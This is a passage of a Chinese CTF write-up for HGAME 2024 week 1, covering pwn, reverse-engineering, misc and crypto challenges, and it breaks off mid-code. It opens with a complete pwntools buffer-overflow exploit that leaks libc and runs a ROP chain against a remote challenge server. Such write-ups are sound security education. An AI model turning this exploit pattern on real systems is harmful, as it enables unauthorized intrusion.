<h2 id="Elden-Ring-Ⅰ"><a href="#Elden-Ring-Ⅰ" class="headerlink" title="Elden Ring Ⅰ"></a>Elden Ring Ⅰ</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon/article/details/135709318">【PWN · ORW | 栈迁移 | ROP】[HGAME 2023 week1]orw</a></p>
<p>不能说完全相同，只能说exp一模一样（</p>
<p>改一下<code>vuln</code> 和<code>rsi</code>的地址即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">rdi=<span class="number">0x4013e3</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.100.245.185&#x27;</span>,<span class="number">30321</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak_libc</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>,payload)</span><br><span class="line">puts_real=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_real:&#x27;</span>+<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base=puts_real-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">### read_bss</span></span><br><span class="line">bss_base=elf.bss()</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">read_real=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">fd=<span class="number">0</span></span><br><span class="line">buf=bss_base+<span class="number">0x100</span></span><br><span class="line">count=<span class="number">0x200</span></span><br><span class="line">rdi=libc_base+<span class="number">0x23b6a</span></span><br><span class="line">rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">rsp=libc_base+<span class="number">0x2f70a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+<span class="number">8</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### rop-&gt;bss</span></span><br><span class="line">payload=<span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># open(const char *pathname, int flags)</span></span><br><span class="line">open_real=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pathname_ptr=buf</span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line">payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">fd=<span class="number">3</span></span><br><span class="line">buf2=buf+<span class="number">0x300</span></span><br><span class="line">count=<span class="number">0x100</span></span><br><span class="line">payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(read_real)</span><br><span class="line"><span class="comment"># write(int handle,void* buf,int length)</span></span><br><span class="line">write_real=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">handle=<span class="number">1</span></span><br><span class="line">buf3=buf2</span><br><span class="line">length=<span class="number">0x50</span></span><br><span class="line">payload+=p64(rdi)+p64(handle)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(write_real)+p64(vuln)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_5_1.png"></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>ida打开即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/r_1_1.png"></p>
<h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>让gpt把汇编转成c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> c[] = &#123;<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">33</span>];</span><br><span class="line"><span class="type">char</span> format[] = <span class="string">&quot;plz input your flag: &quot;</span>;</span><br><span class="line"><span class="type">char</span> success[] = <span class="string">&quot;Congratulations!&quot;</span>;</span><br><span class="line"><span class="type">char</span> failure[] = <span class="string">&quot;Sry, plz try again&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Print prompt</span></span><br><span class="line">    write(<span class="number">1</span>, format, <span class="built_in">strlen</span>(format));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read user input</span></span><br><span class="line">    read(<span class="number">0</span>, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check flag</span></span><br><span class="line">    <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (esi &lt; <span class="number">33</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((flag[esi] ^ <span class="number">0x22</span>) != c[esi]) &#123;</span><br><span class="line">            <span class="comment">// Print failure message</span></span><br><span class="line">            write(<span class="number">1</span>, failure, <span class="built_in">strlen</span>(failure));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// Exit with failure</span></span><br><span class="line">        &#125;</span><br><span class="line">        esi++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print success message</span></span><br><span class="line">    write(<span class="number">1</span>, success, <span class="built_in">strlen</span>(success));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Exit with success</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析可以得知，c数组的每一个数字异或上<code>0x22</code>即可得到flag。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x22</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>用工具脱壳，然后拖到ida分析。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/r_3_1.png"></p>
<p>把<code>word_1400022A0</code>的值异或上<code>0x32</code>即可得到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">0x64</span>,<span class="number">0x7B</span>,<span class="number">0x76</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x49</span>,<span class="number">0x65</span>,<span class="number">0x5D</span>,<span class="number">0x45</span>,<span class="number">0x13</span>,<span class="number">0x6B</span>,<span class="number">2</span>,<span class="number">0x47</span>,<span class="number">0x6D</span>,<span class="number">0x59</span>,<span class="number">0x5C</span>,<span class="number">0x2</span>,<span class="number">0x45</span>,<span class="number">0x6D</span>, <span class="number">6</span>,<span class="number">0x6D</span>,<span class="number">0x5E</span>, <span class="number">3</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x5E</span>,<span class="number">0x1</span>,<span class="number">0x6D</span>,<span class="number">0x2</span>,<span class="number">0x54</span>,<span class="number">0x6D</span>,<span class="number">0x67</span>,<span class="number">0x62</span>,<span class="number">0x6A</span>,<span class="number">0x13</span>,<span class="number">0x4F</span>,<span class="number">0x32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>用 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/pyinstallerextractor/">pyinstxtractor.py</a> 反编译exe</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/r_4_1.png"></p>
<p>这里可以看到python版本是<code>311</code>。</p>
<p>进入反编译后的文件夹，用010修补<code>ezPYC</code>的文件头。</p>
<p>不同的 Python 版本会有不同的 <code>PyObject_HEAD</code>，以下是各版本的文件头：</p>
<table>
<thead>
<tr>
<th>Python 版本</th>
<th>十六进制文件头</th>
</tr>
</thead>
<tbody><tr>
<td>Python 2.7</td>
<td><code>03f30d0a00000000</code></td>
</tr>
<tr>
<td>Python 3.0</td>
<td><code>3b0c0d0a00000000</code></td>
</tr>
<tr>
<td>Python 3.1</td>
<td><code>4f0c0d0a00000000</code></td>
</tr>
<tr>
<td>Python 3.2</td>
<td><code>6c0c0d0a00000000</code></td>
</tr>
<tr>
<td>Python 3.3</td>
<td><code>9e0c0d0a0000000000000000</code></td>
</tr>
<tr>
<td>Python 3.4</td>
<td><code>ee0c0d0a0000000000000000</code></td>
</tr>
<tr>
<td>Python 3.5</td>
<td><code>170d0d0a0000000000000000</code></td>
</tr>
<tr>
<td>Python 3.6</td>
<td><code>330d0d0a0000000000000000</code></td>
</tr>
<tr>
<td>Python 3.7</td>
<td><code>420d0d0a000000000000000000000000</code></td>
</tr>
<tr>
<td>Python 3.8</td>
<td><code>55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00</code></td>
</tr>
<tr>
<td>Python 3.9</td>
<td><code>610d0d0a000000000000000000000000</code></td>
</tr>
<tr>
<td>Python 3.10</td>
<td><code>6f0d0d0a000000000000000000000000</code></td>
</tr>
<tr>
<td>Python 3.11</td>
<td><code>a70d0d0a000000000000000000000000</code></td>
</tr>
</tbody></table>
<p>用 <code>pycdc.exe</code> 反编译修补后的 <code>ezPYC</code>，可以得到部分源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ezPYC.pyc (Python 3.11)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: POP_JUMP_FORWARD_IF_FALSE</span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">input</span>(<span class="string">&#x27;plz input flag:&#x27;</span>)</span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure>

<p>这里猜测一下，flag是<code>flag</code>变量异或上<code>c</code>变量的值</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">87</span>,<span class="number">75</span>,<span class="number">71</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">83</span>,<span class="number">125</span>,<span class="number">117</span>,<span class="number">106</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">48</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">55</span>,<span class="number">94</span>,<span class="number">51</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">119</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">49</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">37</span>,<span class="number">124</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    out = flag[i]^c[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(out),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</span></span><br></pre></td></tr></table></figure>













<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>关注“凌武科技”微信公众号，发送“HGAME2024”获得 Flag！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;welc0me_t0_HGAME_2024&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>图片放手机上，闭上一只眼睛从侧边看即可。（费眼睛）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</span><br></pre></td></tr></table></figure>



<h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h2><p>附件给了张图片和压缩包，压缩包里有一个和外面名字一样的图片，很明显是明文攻击。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_2_1.png"></p>
<p>攻击完成后即可得到未加密的压缩包，解压即可。</p>
<p>查看<code>photo.txt</code>，里面是base64编码，解码后转成图片即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_2_2.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_2_3.png"></p>
<h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个即将发售的游戏的主角薇^3带来了一条消息。这段消息隐藏在加密的图片里</span><br><span class="line">但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。</span><br><span class="line">也许游戏的官网上有这种文字的记录?</span><br><span class="line">补充：flag格式为`hgame\&#123;[a-z0-9_]+\&#125;`</span><br></pre></td></tr></table></figure>

<p>根据题目说明，可以判断是<code>steghide</code>隐写。</p>
<p>用<code>stegseek</code>爆破出密钥为<code>123456</code>，得到一个压缩包。</p>
<p>解压后得到一张图片。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_3_1.png"></p>
<p>根据 <a target="_blank" rel="noopener" href="https://my1l.github.io/Ctrl/CtrlAstr.html">这个网站</a> 来对照字体，得到flag为 <code>hgame&#123;welc0me!&#125;</code></p>
<h2 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h2><p>图片宽高有问题，根据crc算出正确的宽和高，然后修复。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破png的crc，找到宽高</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crc32_hex = <span class="number">0x121b804d</span></span><br><span class="line">filename = <span class="string">&#x27;secret.png&#x27;</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32_hex):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wid:&#x27;</span>, <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hight:&#x27;</span>, <span class="built_in">hex</span>(j))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1394 1999</span></span><br><span class="line"><span class="string">wid: 0x572</span></span><br><span class="line"><span class="string">hight: 0x7cf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_4_1.png"></p>
<p>用<code>zsteg</code>查看，发现有一个压缩包，还看到了一个<code>KEY</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_4_2.png"></p>
<p>将压缩包提取出来并解压，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure>

<p>希尔密码解密，用这个 <a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/hill">在线网站</a> 解密即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/m_4_3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DISAPPEARINTHESEAOFBUTTERFLY</span><br></pre></td></tr></table></figure>













<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line"><span class="string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line"><span class="string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>由费马小定理，可以知道<code>leak1</code>和<code>leak2</code>分别是<code>q</code>和<code>p</code>，直接代进去算即可。</p>
<p>更具体的讲解参考这个视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Sh41177Rm/?vd_source=abef91c9524f8373b84bcdb481407372">【CTF-加密】RSA之leak&#x3D;p^q%n+q^p%n</a></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">q=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">p=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><p>佩尔方程求解</p>
<p>参考这个文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/acdreamers/article/details/8529686">连分数求解Pell方程</a></p>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span 